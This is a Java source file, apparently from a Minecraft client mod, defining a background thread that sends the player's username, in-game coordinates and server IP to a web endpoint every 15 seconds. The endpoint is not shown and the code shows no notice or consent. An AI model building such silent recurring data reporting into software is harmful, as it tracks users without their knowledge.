package me.hexxed.mercury.web;

import java.util.Date;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.util.Session;



public class WebSenderThread
  extends Thread
{
  private boolean sending = true;
  private Minecraft mc = Minecraft.getMinecraft();
  
  public WebSenderThread() { super("Web Sender"); }
  
  public void run()
  {
    while (isSending()) {
      try {
        String username = mc.getSession().getUsername();
        int z;
        int y; int x = y = z = 0;
        String server = null;
        if ((mc.thePlayer != null) && 
          (mc.theWorld != null)) {
          x = (int)mc.thePlayer.posX;
          y = (int)mc.thePlayer.posY;
          z = (int)mc.thePlayer.posZ;
          server = mc.getCurrentServerData().serverIP;
        }
        
        WebUtil.sendWebData(new WebData(new Date(), username, x, y, z, server));
        Thread.sleep(15000L);
      } catch (Exception e) {
        e.printStackTrace();
        sending = false;
      }
    }
  }
  
  public boolean isSending() {
    return sending;
  }
  
  public void setSending(boolean sending) {
    this.sending = sending;
  }
}
